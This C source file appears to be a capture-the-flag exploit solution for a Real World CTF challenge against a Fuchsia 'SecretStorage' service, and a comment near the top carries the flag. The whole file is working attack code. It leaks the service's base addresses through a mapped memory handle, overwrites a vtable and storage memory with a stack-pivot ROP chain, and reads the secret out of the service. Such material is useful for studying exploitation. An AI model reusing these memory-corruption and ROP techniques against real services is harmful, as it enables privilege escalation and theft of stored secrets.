#include <stdint.h>

// rwctf{No_wonder_there_is_zero_reference_to_fuchsia::mem::Range_in_their_codebase}

typedef uint64_t size_t;

typedef struct string {
    char *ptr;
    uint64_t length;
    uint64_t flags;
} string;

struct ctx;

struct SecretStorageVT {
    void *a, *b;
    int (*SecretStorageCreate)(struct ctx *, const string *, const string *, int *);
    int (*SecretStorageListKeys)(struct ctx *, void *);
    int (*SecretStorageGetContent)(struct ctx *, const string *, void *);
    int (*SecretStorageDelete)(struct ctx *, const int, int *);
    int (*SecretStorageReset)(struct ctx*);
};

struct ctx {
    struct SecretStorageVT *vt1;
    void *vt2;
    void *chan;
};

void *memset(void *b, int c, size_t len);
void *memcpy(void *dst, const void *src, size_t len);

const char *c_str(const string *str);
size_t length(const string *str);
void set_string(string *str, const char *o, size_t len);

void _start() {
    uintptr_t text_base = (uintptr_t)__builtin_return_address(0) - 0x7205;
    int (*printf)(const char *, ...);
    int (*exit)(int);
    void *(*malloc)(size_t);
    void *(*zx_vmar_root_self)();
    int (*zx_vmar_map)(void *, int, int, void *, uint64_t, uint64_t, uintptr_t *);
    *(uintptr_t *)&printf = text_base + 0x10C40;
    *(uintptr_t *)&exit = text_base + 0x10C00;
    *(uintptr_t *)&malloc = text_base + 0x10E10;
    *(uintptr_t *)&zx_vmar_root_self = text_base + 0x10CB0;
    *(uintptr_t *)&zx_vmar_map = text_base + 0x10CC0;
    struct ctx *ctx = *(struct ctx **)(text_base + 0x12140);
    printf("hello world %#llx\n", text_base);

#define STRING(v, l) { \
    .ptr = v, \
    .length = l, \
    .flags = 0x8000000000000000 + l + 0x10 \
}

    string key = STRING(malloc(0x10000), 0x10000);
    string value = STRING(malloc(0x10000), 0x10000);

    set_string(&key, "aaa", 3);
    set_string(&value, "bbb", 3);
    
    int ret = 0, id = -1;
    ret = ctx->vt1->SecretStorageCreate(ctx, &key, &value, &id);
    printf("create %d: %d\n", ret, id);
    void **handle = (void *)0;
    ret = ctx->vt1->SecretStorageGetContent(ctx, &key, &handle);
    printf("getcontent %d: %p\n", ret, handle);
    printf("val: %p\n", *handle);

    void *root = zx_vmar_root_self();
    printf("root = %p\n", root);
    uintptr_t addr = 0;
    printf("map = %d\n", zx_vmar_map(root, 3, 0, *handle, 0, 0x1000, &addr));

    uint64_t storage_vtable = *(uint64_t *)addr;
    uint64_t storage = *(uint64_t *)(addr + 0x50);
    uint64_t service_base = storage_vtable - 0x13060;
    printf("service text base = %#lx\n", service_base);
    printf("storage = %#lx\n", storage);

    // 0x6927 push rax; mov r14, rdi; mov rax, [rdi, 0x20]; add rdi, 0x30; call [rax + 0x20]
    // 0x55d4 push rax; jmp [rsi + 0x2e]
    // 0x5485 pop rsp; pop r13; pop r14; pop r15; ret;
    // 0x7bdb mov rsi, [rsp + 0x28]; mov rdx, [rsp + 0x30]; mov rcx, rbp; call [rax + 0x10]
    *(uint64_t *)(addr + 0x410) = service_base + 0x6927;
    *(uint64_t *)(addr + 0x20) = storage + 0x440;
    *(uint64_t *)(addr + 0x460) = service_base + 0x6927;
    *(uint64_t *)(addr + 0x50) = storage + 0x480;
    *(uint64_t *)(addr + 0x4a0) = service_base + 0x6927;
    *(uint64_t *)(addr + 0x80) = storage + 0x4c0;
    *(uint64_t *)(addr + 0x4e0) = service_base + 0x7bdb;
    *(uint64_t *)(addr + 0x4d0) = service_base + 0x55d4;
    *(uint64_t *)(addr + 0x42e) = service_base + 0x5485;
    *(uint64_t *)(addr + 0x4d8) = service_base + 0x548a; // pop r15; ret;

    // real rop
    *(uint64_t *)(addr + 0x4e8) = service_base + 0x5686; // pop rdi; ret;
    *(uint64_t *)(addr + 0x4f0) = 3;
    *(uint64_t *)(addr + 0x4f8) = service_base + 0x53cd; // pop rsi; ret;
    *(uint64_t *)(addr + 0x500) = storage + 0x800;
    *(uint64_t *)(addr + 0x508) = service_base + 0x1266a; // pop rcx; ret;
    *(uint64_t *)(addr + 0x510) = storage + 0x600;
    *(uint64_t *)(addr + 0x518) = service_base + 0x11a45; // pop rdx; mov [rcx], ...; ret;
    *(uint64_t *)(addr + 0x520) = 0x800;
    *(uint64_t *)(addr + 0x528) = service_base + 0x12900; // read
    *(uint64_t *)(addr + 0x530) = 0x44444;

    *(uint64_t *)addr = storage + 0x400;

    ret = ctx->vt1->SecretStorageCreate(ctx, &key, &value, &id);
    printf("delete %d: %d\n", ret, id);
    printf("flag: %s\n", addr + 0x800);

    exit(0);
}

void *memset(void *b, int c, size_t len) {
    for (int i = 0; i < len; i++) {
        ((uint8_t *)b)[i] = c;
    }
    return b;
}

const char *c_str(const string *str) {
    if (str->flags & 0x8000000000000000) {
        return str->ptr;
    } else {
        return (const char *)str;
    }
}

size_t length(const string *str) {
    if (str->flags & 0x8000000000000000) {
        return str->length;
    } else {
        return (str->length >> 56) & 0xff;
    }
}

void set_string(string *str, const char *o, size_t len) {
    memcpy(str->ptr, o, len);
    str->length = len;
}

void *memcpy(void *dst, const void *src, size_t len) {
    for (int i = 0; i < len; i++) {
        ((uint8_t *)dst)[i] = ((uint8_t *)src)[i];
    }
    return dst;
}
